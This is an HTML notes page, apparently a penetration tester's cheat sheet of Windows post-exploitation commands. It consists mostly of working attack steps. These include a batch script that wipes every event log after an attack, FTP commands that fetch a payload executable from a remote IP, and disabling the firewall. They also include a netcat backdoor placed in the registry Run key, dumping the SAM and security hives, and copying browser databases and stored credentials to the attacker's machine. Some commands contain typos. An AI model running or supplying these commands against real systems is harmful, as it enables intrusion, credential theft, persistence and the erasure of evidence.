<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Various</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Various</h1><br/><br /><h2>Post-exploitation Techniques and Commands</h2><br />• <a href="http://www.robvanderwoude.com/ntadmincommands.php">Useful Commands for Windows Administrators</a> - Post-exploitation techniques and commands to elicit information from shell of compromised windows machine.<br />• <a href="https://ss64.com/nt/">A-Z List of Windows Shell Commands</a> - A-Z Listing of all Windows CMD Commands<br />• <a href="https://github.com/Agahlot/RTFM/blob/master/rtfm-red-team-field-manual.pdf">Red Team Field Manual</a> - Windows Post-Exploitation techniques and commands.<br /><br /><h3>Clear Log Files</h3><br />A simple script to clear logs post attack.<br />Create a batch file and execute it as admin.<br />@echo off FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V IF (%adminTest%)==(Access) goto noAdmin for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G") echo. echo goto theEnd :do_clear echo clearing %1 wevtutil.exe cl %1 goto :eof :noAdmin exit<br /><br /><h3>Transfer files to compromised host via non-interactive shell</h3><br />In cases where you want to upload a file onto the compromised machine  but you don't have an interactive shell where you simply upload the  file, you can write it onto the compromised machine using FTP, feeding  it one line at a time.<br />Create a blank file to write commands onto ftp -s:ftp_commands.txt<br />Echo each command (you can also do this all in one line):<br />echo open 10.9.122.8&gt;ftp_commands.txt echo anonymous&gt;ftp_commands.txt echo blah&gt;ftp_commands.txt echo binary&gt;ftp_commands.txt echo get met8888.exe&gt;ftp_commands.txt echo bye&gt;ftp_commands.txt<br />*Instead of ftp_commands.txt, use a unique name, hide the file in a  datastream, or hide the file in the folder. aka don't be obvi<br /><br /><h3>Query state of Firewall, Disable Firewall, Allow a Service Through</h3><br /><strong>Query state of firewall:</strong><br />netsh firewall show state<br /><br /><strong>Disable firewall</strong><br />netsh.exe firewall set opmode mode=disable profile=all<br /><br /><strong>Allow service through firewall</strong><br />netsh.exe firewall set portopening tcp 123 MYSERVICE enable all<br />netsh.exe firewall set allowedprogram C:\MYPROGRAM.exe<br />HKLM\software\microsoft\windows\ currentversion\run –d ‘C:\windows\system32\nc.exe -Ldp 4444 -e cmd.exe’ –v netcat<br />netsh firewall set allowedprogram c:\nc.exe allow_nc ENABLE<br /><br /><strong>Query current user and privilege information</strong><br />whoami<br />whoami /all<br />whoami /user<br />whoami /groups<br />whoami /priv<br /><br /><strong>[Users]</strong><br />net users: list users<br />For more info on a user:<br />net user  (for local user)<br />net user  /domain (for a domain user)<br />View domain admins:<br />net group "Domain Admins" /domain<br />View name of domain controller:<br />reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /v DC<br />Add user:<br />net users   /add<br />Add user to local administrators group:<br />net localgroup administrators  /add<br />Delete a user:<br />net users username /delete /domain<br />Change user's password:<br />net users  &lt;new_password&gt;<br />[Accounts &amp; Groups]<br />net accounts<br />net accounts /domain<br />net logalgroup administrators<br />net localgroup administrators /dmain<br />net group "domain Admins" /domain<br />net group "Enterprise Admins" /domain<br />net view /localgroup<br />net localgroup Administrators<br />net localgroup /Domain<br />gpresult: view group policy<br />gupdate: update group policy<br />gpresult /z<br /><br /><strong>[Network and misc information]</strong><br />systeminfo:  lists information about system<br />ipconfig/all: Query ip configuation<br />ipconfig /displaydns<br />route print: Prints machines routing table<br />arp -a: Lists all systems current in the machine's ARP table<br />nslookup: Query server information<br />nbtstat: Displays protocol stats and current TCP/IP connections using NetBIOS over TCP/IP<br />qwinsta: Query info about RDP sessions<br />net session: Query session information<br />net time \computername (Shows the time of target computer)<br />net share: view shared resources on network<br />[Query current drives on system]<br />fsutil fsinfo drives<br /><br /><strong>[Grab SAM and SYSTEM files]</strong><br />type "C:/windows/repair/SAM"<br />type "C:/windows/repair/SYSTEM"<br /><br /><strong>[Tasks]</strong><br />tasklist /svc: lists running processes<br />taskkill /PID  /F : forcibly kill task<br />taskkill taskkill /PID xxx taskkill /IM name* of process to be terminated * can be used to kill all processes with same name<br />tasklist /V /S computername: Lists tasks w/users running those tasks  on a remote system. This will remove any IPC$ connection after it is  done so if you are using another user, you need to re-initiate the IPC$  mount<br />qprocess*: Similar to tasklist but easier to read<br />at: Query current scheduled tasks<br />schtasks: Query scheduled tasks that your current user has access to see.<br />schtasks /query /fo csv /v &gt; %TEMP%<br /><br /><strong>[Netstat]</strong><br />netstat -ano : to see what services are running on what ports<br />netstat -bano<br />netstat -r<br />netstat -na | findstr :443<br /><br /><strong>[Query information about server and workstation, Workstation domain name and Logon domain]</strong><br />net config server<br />net config workstation<br /><br /><strong>[Change drive to different drive letter]</strong><br />ex change to D:/ directory and list it's contents:<br />d: &amp; dir<br />cd /d d: &amp; dir<br />dir \computername\share_or_admin_share\ (dir list a remote directory)<br /><br /><strong>[Cat contents of file located in D:/ directory]</strong><br />cd /d &amp; type d:\blah\blah<br /><br /><strong>[net view]</strong><br />net view /domain[:DomainName]<br />net view \computerName<br /><br /><strong>[Services]</strong><br />View list processes started upon startup<br />net start<br />wmic startup get caption,command<br /><br /><strong>[Query, Stop/Start/Pause Installed Services]</strong><br />sc query state= all<br />sc query <br />sc  <br /><br /><strong>[Remote System Access]</strong><br />reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<br />net share \computername<br />tasklist /V /S computername<br />qwinsta /SERVER:computername<br />qprocess /SERVER:computername<br /><br /><strong>*[WMI]</strong><br />wmic bios<br />wmic qfe<br />wmic qfe get hotfixid (This gets patches IDs)<br />wmic startup<br />wmic service<br />wmic os<br />wmic process get caption,executablepath,commandline<br />wmic process call create “process_name” (executes a program)<br />wmic process where name=”process_name” call terminate (terminates program)<br />wmic logicaldisk where drivetype=3 get name, freespace, systemname,  filesystem, size, volumeserialnumber (hard drive information)<br />wmic useraccount (usernames, sid, and various security related goodies)<br />wmic useraccount get /ALL<br />wmic share get /ALL (you can use ? for gets help ! )<br />wmic startup list full (this can be a huge list!!!)<br />wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)<br /><br /><strong>[Reg Command]</strong><br />reg save HKLM\Security security.hive (Save security hive to a file)<br />reg save HKLM\System system.hive (Save system hive to a file)<br />reg save HKLM\SAM sam.hive (Save sam to a file)=<br />reg add [\TargetIPaddr] [RegDomain][ \Key ]<br />reg export [RegDomain][Key] [FileName]<br />reg import [FileName ]<br />reg query [\TargetIPaddr] [RegDomain][ Key ] /v [Valuename!] (you can to add /s for recurse all values )<br /><br /><strong>[Deleting Logs]</strong><br />wevtutil el (list logs)<br />wevtutil cl<br /><br /><strong>[Uninstalling Software]</strong><br />wmic proud get name /value: gets software names<br />wmic product where name="XXX": call uninstall /Interactive:Off: unintalss software<br /><br /><strong>[Permissions]</strong><br />icacls<br />Grant full access over directory and encompassing folders and files:<br />icacls "C:\windows" /grant Administrator:F /T<br />icacls "C:" /grant "nt authority\system": F /T<br /><br /><strong>[Net use]</strong><br />net use: Map network shares<br />net use \computername (maps IPC$ which does not show up as a drive)<br />net use \computername /user:DOMAINNAME\username password ○ (maps IPC$ under another username)<br /><br /><strong>[Mount a remote share with the rights of the current user]:</strong><br />net use K: \&lt;share&gt;<br />dir K:<br /><br /><strong>[Enable remote desktop]</strong><br />reg add "HKLM\System\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /f<br />net session: list session information<br /><br /><strong>[Other useful Commands]</strong><br />pkgmgr usefull /iu :"Package"<br />pkgmgr usefull /iu :"TellnetServer": install telnet service<br />pkgmgr /iu:"TelnetClient"<br />rundll32.exe user32.dll, LockWorkStation: locks the screen<br />wscript.exe &lt;script js/vbs&gt;<br />cscript.exe &lt;script js/vbs/c#&gt;<br />xcopy /C /S %appdata%\Mozilla\Firefox\Profiles*.sqlite \your_box<br />type "C:\documents and settings\administrator\userdata\index.dat"<br />type %WINDIR%\System32\drivers\etc\hosts: view contents of hosts files<br />type "c:\Documents and Settings\Administrator\Local Settings\Application Data\Microsoft\Credentials"<br />cd "C:/Documents and settings\administrator\userdata" &amp; dir<br />type "c:\Documents and Settings\Administrator\Desktop\UserMysql.txt"<br />type "c:\Documents and Settings\Administrator\Application Data\MySQL\mysqlx_user_connections.xml"<br />type "C:\documents and settings\administrator\userdata\index.dat"<br /></div></body></html>